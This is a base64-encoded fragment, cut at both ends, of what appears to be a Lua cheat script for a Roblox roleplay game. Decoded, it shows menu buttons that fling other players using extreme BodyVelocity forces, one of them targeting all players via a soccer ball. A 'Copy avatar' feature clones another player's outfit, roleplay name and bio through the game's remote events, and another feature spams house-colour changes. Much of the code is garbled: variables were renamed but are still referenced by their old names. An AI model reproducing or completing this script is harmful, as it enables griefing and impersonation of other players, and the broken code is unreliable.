3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaWYgbm90IHJvb3Qgb3Igbm90IHRSb290IHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIHZhcl96MzVjM2ggPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCB2YXJfczE3cHVyID0gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICBsb2NhbCB2YXJfdnFvbnAzID0gcm9vdC5DRnJhbWUKCiAgICAKICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxQ2xlYTFyVG9vbDFzIik6RmlyZVNlcnZlcigiQ2xlYXJBbGxUb29scyIpCiAgICAgICAgdGFzay53YWl0KDAuMikKCiAgCiAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuUkU6RmluZEZpcnN0Q2hpbGQoIjFUb28xbCIpOkludm9rZVNlcnZlcigiUGlja2luZ1Rvb2xzIiwgIkNvdWNoIikKICAgICAgICB0YXNrLndhaXQoMC4zKQoKICAgICAgICBsb2NhbCB2YXJfM2c4ZDhlID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkNvdWNoIikKICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBjaGFyCiAgICAgICAgZW5kCnRhc2sud2FpdCgwLjEpCgpnYW1lOkdldFNlcnZpY2UoIlZpcnR1YWxJbnB1dE1hbmFnZXIiKTpTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkYsIGZhbHNlLCBnYW1lKQp0YXNrLndhaXQoMC4yNSkKCiAgICAgICAgd29ya3NwYWNlLkZhbGxlblBhcnRzRGVzdHJveUhlaWdodCA9IDAvMAoKICAgICAgICBsb2NhbCB2YXJfdWt1cW45ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQogICAgICAgIGJ2Lk5hbWUgPSAiRmxpbmdGb3JjZSIKICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgYnYuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgICAgIGJ2LlBhcmVudCA9IHJvb3QKCiAgICAgICAgaHVtOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgZmFsc2UpCiAgICAgICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIG9yIHRSb290IG9yIGh1bQoKIAogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCB2YXJfcmFneTdoID0gMAogICAgICAgICAgICBsb2NhbCB2YXJfcnlyYXRnID0ge3Jvb3R9CiAgICAgICAgICAgIHdoaWxlIGZsaW5nQWN0aXZlIGFuZCB0YXJnZXQgYW5kIHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGRvCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdjRpdWs0ID0gdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgIGlmIHRIdW0uU2l0IHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICBhbmdsZSArPSA3NjY5NzU5Njc5MzU2CgogICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gaXBhaXJzKHBhcnRzKSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl82bWI4bTggPSB0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdmp2d3liID0gaHJwLlBvc2l0aW9uICsgaHJwLlZlbG9jaXR5IC8gMS41CiAgICAgICAgICAgICAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KHBvcykgKiBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKGFuZ2xlKSwgMCwgMCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHJvb3QuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQogICAgICAgICAgICAgICAgcm9vdC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBlbmQKCiAgICAgICAgIAogICAgICAgICAgICBmbGluZ0FjdGl2ZSA9IGZhbHNlCiAgICAgICAgICAgIGJ2OkRlc3Ryb3koKQogICAgICAgICAgICBodW06U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQogICAgICAgICAgICBodW0uUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICAgICAgICAgIHJvb3QuQ0ZyYW1lID0gb3JpZ2luYWwKICAgICAgICAgICAgY2FtLkNhbWVyYVN1YmplY3QgPSBodW0KCiAgICAgICAgICAgIGZvciBfLCBwIGluIHBhaXJzKGNoYXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIHA6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwLlZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAgICAgcC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaHVtOlVuZXF1aXBUb29scygpCiAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIoIlBpY2tpbmdUb29scyIsICJDb3VjaCIpCiAgICAgICAgZW5kKQogICAgICAgCiAgICAgICAgd2hpbGUgZmxpbmdBY3RpdmUgZG8KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBlbmQKICAgIGVuZAoKCiAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBQcm9jZXNzUGxheWVyKHBsYXllcikKCQkJZW5kCiAgICBlbmQKfSkKCgpUcm9sbDpBZGRCdXR0b24oewogICAgTmFtZSA9ICJGbGluZyBCYWxsIEFsbCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9jYWwgdmFyX3FwbmduYz1nYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgpsb2NhbCB2YXJfeTRyZTg5PXdvcmtzcGFjZS5Xb3Jrc3BhY2VDb21bIjAwMV9Tb2NjZXJCYWxscyJdCmxvY2FsIHZhcl85Zzl3OGE9U29jY2VyQmFsbHM6RmluZEZpcnN0Q2hpbGQoIlNvY2NlciIuLnBsYXllci5OYW1lKQoKaWYgbm90IE15QmFsbCB0aGVuCmlmIG5vdCBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlNvY2NlckJhbGwiKSB0aGVuCmxvY2FsIHZhcl94dWR2NXo9e1sxXT0iUGlja2luZ1Rvb2xzIixbMl09IlNvY2NlckJhbGwifQpnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFUb28xbCIpOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCnRhc2sud2FpdCgpCnBsYXllci5CYWNrcGFjay5Tb2NjZXJCYWxsLlBhcmVudD1wbGF5ZXIuQ2hhcmFjdGVyCnJlcGVhdCBNeUJhbGw9U29jY2VyQmFsbHM6RmluZEZpcnN0Q2hpbGQoIlNvY2NlciIuLnBsYXllci5OYW1lKSB0YXNrLndhaXQoKSB1bnRpbCBNeUJhbGwKcGxheWVyLkNoYXJhY3Rlci5Tb2NjZXJCYWxsLlBhcmVudD1wbGF5ZXIuQmFja3BhY2sKdGFzay53YWl0KCkKZWxzZQpwbGF5ZXIuQmFja3BhY2suU29jY2VyQmFsbC5QYXJlbnQ9cGxheWVyLkNoYXJhY3RlcgpyZXBlYXQgTXlCYWxsPVNvY2NlckJhbGxzOkZpbmRGaXJzdENoaWxkKCJTb2NjZXIiLi5wbGF5ZXIuTmFtZSkgdGFzay53YWl0KCkgdW50aWwgTXlCYWxsCnBsYXllci5DaGFyYWN0ZXIuU29jY2VyQmFsbC5QYXJlbnQ9cGxheWVyLkJhY2twYWNrCmVuZAplbmQKCgpmb3IgaSx2IGluIHBhaXJzKGdhbWUuUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCmlmIHZ+PWdhbWUuUGxheWVycy5Mb2NhbFBsYXllciB0aGVuCmxvY2FsIHZhcl9yemd4aGU9dgpsb2NhbCB2YXJfdHM3bnZhPXRhcmdldC5DaGFyYWN0ZXIgb3IgdGFyZ2V0LkNoYXJhY3RlckFkZGVkOldhaXQoKQpsb2NhbCB2YXJfcnAzM2RhPVRDaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKaWYgbm90IE15QmFsbCBvciBub3QgVEh1bWFub2lkUm9vdFBhcnQgdGhlbiByZXR1cm4gZW5kCgpmb3IgXyx2IGluIHBhaXJzKE15QmFsbDpHZXRDaGlsZHJlbigpKSBkbwppZiB2OklzQSgiQm9keU1vdmVyIikgdGhlbiB2OkRlc3Ryb3koKSBlbmQKZW5kCgpsb2NhbCB2YXJfbDl5YWJxPUluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IikKYm9keVZlbG9jaXR5LlZlbG9jaXR5PVZlY3RvcjMubmV3KDllOCw5ZTgsOWU4KQpib2R5VmVsb2NpdHkuTWF4Rm9yY2U9VmVjdG9yMy5uZXcoMS8wLDEvMCwxLzApCmJvZHlWZWxvY2l0eS5QPTFlMTAKYm9keVZlbG9jaXR5LlBhcmVudD1NeUJhbGwKCmxvY2FsIHZhcl8xOTJvdDM9SW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQpidi5WZWxvY2l0eT1WZWN0b3IzLm5ldyg5ZTgsOWU4LDllOCkKYnYuTWF4Rm9yY2U9VmVjdG9yMy5uZXcoMS8wLDEvMCwxLzApCmJ2LlA9MWU5CmJ2LlBhcmVudD1USHVtYW5vaWRSb290UGFydAoKbG9jYWwgdmFyXzBkaXM2Yz1USHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbgp3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0PVRIdW1hbm9pZFJvb3RQYXJ0CgpyZXBlYXQKbG9jYWwgdmFyX3lvcW1nMj1USHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5NYWduaXR1ZGUKbG9jYWwgdmFyXzV2OHR2ZT17fQpmb3IgXyx2IGluIHBhaXJzKFRDaGFyYWN0ZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KaWYgdjpJc0EoIkJhc2VQYXJ0IikgYW5kIHYuQ2FuQ29sbGlkZSBhbmQgbm90IHYuQW5jaG9yZWQgdGhlbiB0YWJsZS5pbnNlcnQocGFydHMsdikgZW5kCmVuZApmb3IgXyxwYXJ0IGluIGlwYWlycyhwYXJ0cykgZG8KbG9jYWwgdmFyX29uaDc2bD10YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWApsb2NhbCB2YXJfZXozYWx5PXRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5ZCmxvY2FsIHZhcl9wY3hrdXE9dGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLloKcG9zX3g9cG9zX3grKHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5YLzEuNSkKcG9zX3k9cG9zX3krKHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5ZLzEuNSkKcG9zX3o9cG9zX3orKHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5aLzEuNSkKTXlCYWxsLkNGcmFtZT1DRnJhbWUubmV3KHBvc194LHBvc195LHBvc196KQp0YXNrLndhaXQoMS82MDAwKQplbmQKdGFzay53YWl0KDEvNjAwMCkKdW50aWwgVEh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuTWFnbml0dWRlPjUwMDAgb3IgVENoYXJhY3Rlci5IdW1hbm9pZC5IZWFsdGg9PTAgb3IgdGFyZ2V0LlBhcmVudH49Z2FtZS5QbGF5ZXJzIG9yIFRIdW1hbm9pZFJvb3RQYXJ0LlBhcmVudH49VENoYXJhY3RlciBvciBUQ2hhcmFjdGVyfj10YXJnZXQuQ2hhcmFjdGVyCgplbmQKZW5kCgp3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0PWdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICBlbmQKfSkKCmxvY2FsIHZhcl91aTliZHEgPSBXaW5kb3c6TWFrZVRhYih7IkNvcHkiLCAicmJ4YXNzZXRpZDovLzEwNzM0OTUyMDM2In0pCgpUYWI6QWRkU2VjdGlvbih7IE5hbWUgPSAiQ29weWluZyBjbG90aGVzIiB9KQoKCgpsb2NhbCB2YXJfdDQ2dDJrID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgdmFyXzlzZXA0OCA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQpsb2NhbCB2YXJfY2FsdHYyID0gUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJSZW1vdGVzIikKCmxvY2FsIHZhcl9hZGU0OHIgPSBuaWwKCi0tIEZ1bmN0aW9uIHRvIGdldCBwbGF5ZXIgbmFtZXMKbG9jYWwgdmFyX21mbmx2eCBHZXRQbGF5ZXJOYW1lcygpCiAgICBsb2NhbCB2YXJfZ2N2aHl4ID0ge30KICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIHRhYmxlLmluc2VydChQbGF5ZXJOYW1lcywgcGxheWVyLk5hbWUpCiAgICBlbmQKICAgIHJldHVybiBQbGF5ZXJOYW1lcwplbmQKCi0tIFBsYXllciBzZWxlY3Rpb24gZHJvcGRvd24KbG9jYWwgdmFyX3Y2ZDFteSA9IFRhYjpBZGREcm9wZG93bih7CiAgICBOYW1lID0gIlNlbGVjdCIsCiAgICBPcHRpb25zID0gR2V0UGxheWVyTmFtZXMoKSwKICAgIERlZmF1bHQgPSBUYXJnZXQsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIFRhcmdldCA9IFZhbHVlCiAgICBlbmQKfSkKCi0tIFVwZGF0ZSBkcm9wZG93biBvcHRpb25zIHdoZW4gc29tZW9uZSBqb2lucyBvciBsZWF2ZXMKbG9jYWwgdmFyX3hkMm15eSBVcGRhdGVEcm9wZG93bigpCiAgICBEcm9wZG93bjpSZWZyZXNoKEdldFBsYXllck5hbWVzKCksIHRydWUpCmVuZAoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KFVwZGF0ZURyb3Bkb3duKQpQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoVXBkYXRlRHJvcGRvd24pCgpUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiQ29weSBhdmF0YXIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgbm90IFRhcmdldCB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgbG9jYWwgdmFyXzJ6ZTFkNCA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCB2YXJfNTRzdGh1ID0gTFAuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgdmFyXzg5ZzdxYiA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoVGFyZ2V0KQoKICAgICAgICBpZiBUUGxheWVyIGFuZCBUUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGxvY2FsIHZhcl9nMnN3MXEgPSBMQ2hhciBhbmQgTENoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIGxvY2FsIHZhcl85Ym14Y2sgPSBUUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKCiAgICAgICAgICAgIGlmIExIdW1hbm9pZCBhbmQgVEh1bWFub2lkIHRoZW4KICAgICAgICAgICAgICAgIC0tIFJFU0VUIExPQ0FMUExBWUVSCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfcTZzNnd5ID0gTEh1bWFub2lkOkdldEFwcGxpZWREZXNjcmlwdGlvbigpCgogICAgICAgICAgICAgICAgLS0gUmVtb3ZlIGN1cnJlbnQgYWNjZXNzb3JpZXMsIGNsb3RoZXMsIGFuZCBmYWNlCiAgICAgICAgICAgICAgICBmb3IgXywgYWNjIGluIGlwYWlycyhMRGVzYzpHZXRBY2Nlc3Nvcmllcyh0cnVlKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBhY2MuQXNzZXRJZCBhbmQgdG9udW1iZXIoYWNjLkFzc2V0SWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFyOkludm9rZVNlcnZlcih0b251bWJlcihhY2MuQXNzZXRJZCkpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihMRGVzYy5TaGlydCkgdGhlbgogICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuV2VhcjpJbnZva2VTZXJ2ZXIodG9udW1iZXIoTERlc2MuU2hpcnQpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihMRGVzYy5QYW50cykgdGhlbgogICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuV2VhcjpJbnZva2VTZXJ2ZXIodG9udW1iZXIoTERlc2MuUGFudHMpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihMRGVzYy5GYWNlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFyOkludm9rZVNlcnZlcih0b251bWJlcihMRGVzYy5GYWNlKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgLS0gQ09QWSBGUk9NIFRBUkdFVCBQTEFZRVIKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9vNjg4c2UgPSBUSHVtYW5vaWQ6R2V0QXBwbGllZERlc2NyaXB0aW9uKCkKCiAgICAgICAgICAgICAgICAtLSBTZW5kIGJvZHkgcGFydHMKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9ncDdnbWsgPSB7CiAgICAgICAgICAgICAgICAgICAgWzFdID0gewogICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSBQRGVzYy5Ub3JzbywKICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gUERlc2MuUmlnaHRBcm0sCiAgICAgICAgICAgICAgICAgICAgICAgIFszXSA9IFBEZXNjLkxlZnRBcm0sCiAgICAgICAgICAgICAgICAgICAgICAgIFs0XSA9IFBEZXNjLlJpZ2h0TGVnLAogICAgICAgICAgICAgICAgICAgICAgICBbNV0gPSBQRGVzYy5MZWZ0TGVnLAogICAgICAgICAgICAgICAgICAgICAgICBbNl0gPSBQRGVzYy5IZWFkCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgUmVtb3Rlcy5DaGFuZ2VDaGFyYWN0ZXJCb2R5Okludm9rZVNlcnZlcih1bnBhY2soYXJnc0JvZHkpKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihQRGVzYy5TaGlydCkgdGhlbgogICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuV2VhcjpJbnZva2VTZXJ2ZXIodG9udW1iZXIoUERlc2MuU2hpcnQpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjMpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihQRGVzYy5QYW50cykgdGhlbgogICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuV2VhcjpJbnZva2VTZXJ2ZXIodG9udW1iZXIoUERlc2MuUGFudHMpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjMpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihQRGVzYy5GYWNlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFyOkludm9rZVNlcnZlcih0b251bWJlcihQRGVzYy5GYWNlKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKFBEZXNjOkdldEFjY2Vzc29yaWVzKHRydWUpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuQXNzZXRJZCBhbmQgdG9udW1iZXIodi5Bc3NldElkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuV2VhcjpJbnZva2VTZXJ2ZXIodG9udW1iZXIodi5Bc3NldElkKSkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl81eXdudjEgPSBUUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQm9keSBDb2xvcnMiKQogICAgICAgICAgICAgICAgaWYgU2tpbkNvbG9yIHRoZW4KICAgICAgICAgICAgICAgICAgICBSZW1vdGVzLkNoYW5nZUJvZHlDb2xvcjpGaXJlU2VydmVyKHRvc3RyaW5nKFNraW5Db2xvci5IZWFkQ29sb3IpKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjMpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0b251bWJlcihQRGVzYy5JZGxlQW5pbWF0aW9uKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5XZWFyOkludm9rZVNlcnZlcih0b251bWJlcihQRGVzYy5JZGxlQW5pbWF0aW9uKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgLS0gTmFtZSwgYmlvLCBhbmQgY29sb3IKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl8xd3o2NWggPSBUUGxheWVyOkZpbmRGaXJzdENoaWxkKCJQbGF5ZXJzQmFnIikKICAgICAgICAgICAgICAgIGlmIEJhZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgQmFnOkZpbmRGaXJzdENoaWxkKCJSUE5hbWUiKSBhbmQgQmFnLlJQTmFtZS5WYWx1ZSB+PSAiIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuUlBOYW1lVGV4dDpGaXJlU2VydmVyKCJSb2xlUGxheU5hbWUiLCBCYWcuUlBOYW1lLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIEJhZzpGaW5kRmlyc3RDaGlsZCgiUlBCaW8iKSBhbmQgQmFnLlJQQmlvLlZhbHVlIH49ICIiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5SUE5hbWVUZXh0OkZpcmVTZXJ2ZXIoIlJvbGVQbGF5QmlvIiwgQmFnLlJQQmlvLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIEJhZzpGaW5kRmlyc3RDaGlsZCgiUlBOYW1lQ29sb3IiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJlbW90ZXMuUlBOYW1lQ29sb3I6RmlyZVNlcnZlcigiUGlja2luZ1JQTmFtZUNvbG9yIiwgQmFnLlJQTmFtZUNvbG9yLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIEJhZzpGaW5kRmlyc3RDaGlsZCgiUlBCaW9Db2xvciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3Rlcy5SUE5hbWVDb2xvcjpGaXJlU2VydmVyKCJQaWNraW5nUlBCaW9Db2xvciIsIEJhZy5SUEJpb0NvbG9yLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBEZWZpbmUgY29sb3JzIGZvciBSR0IgZWZmZWN0CmxvY2FsIHZhcl9hMWUwdzIgPSB7CiAgICBDb2xvcjMubmV3KDEsIDAsIDApLCAgICAgICAtLSBSZWQKICAgIENvbG9yMy5uZXcoMCwgMSwgMCksICAgICAgIC0tIEdyZWVuCiAgICBDb2xvcjMubmV3KDAsIDAsIDEpLCAgICAgICAtLSBCbHVlCiAgICBDb2xvcjMubmV3KDEsIDEsIDApLCAgICAgICAtLSBZZWxsb3cKICAgIENvbG9yMy5uZXcoMCwgMSwgMSksICAgICAgIC0tIEN5YW4KICAgIENvbG9yMy5uZXcoMSwgMCwgMSkgICAgICAgIC0tIE1hZ2VudGEKfQoKLS0gVmFyaWFibGUgdG8gY29udHJvbCB0aGUgc3RhdGUgb2YgdGhlIEhvdXNlIFJHQiB0b2dnbGUKbG9jYWwgdmFyX3VvZGNvdyA9IGZhbHNlCgotLSBGdW5jdGlvbiB0byBjaGFuZ2UgdGhlIGhvdXNlIGNvbG9yCmxvY2FsIHZhcl80bnF2d3cgY2hhbmdlQ29sb3IoKQogICAgbG9jYWwgdmFyX3h0bnN2MiA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQogICAgbG9jYWwgdmFyX3V1YmhpYiA9IHJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKCJSRSIpIGFuZCByZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMVBsYXllcjFzSG91czFlIikKICAgIAogICAgaWYgbm90IHJlbW90ZUV2ZW50IHRoZW4KICAgICAgICB3YXJuKCJSZW1vdGVFdmVudCAnMVBsYXllcjFzSG91czFlJyBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIHdoaWxlIGlzSG91c2VSR0JBY3RpdmUgZG8KICAgICAgICBmb3IgXywgY29sb3IgaW4gaXBhaXJzKGNvbG9ycykgZG8KICAgICAgICAgICAgaWYgbm90IGlzSG91c2VSR0JBY3RpdmUgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIHZhcl9hMHJ1aGcgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSAiQ29sb3JQaWNrSG91c2UiLAogICAgICAgICAgICAgICAgWzJdID0gY29sb3IKICAgICAgICAgICAgfQogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICByZW1vdGVFdmVudDpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICB0YXNrLndhaXQoMC44KQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgdmFyXzRvemc2aCB0b2dnb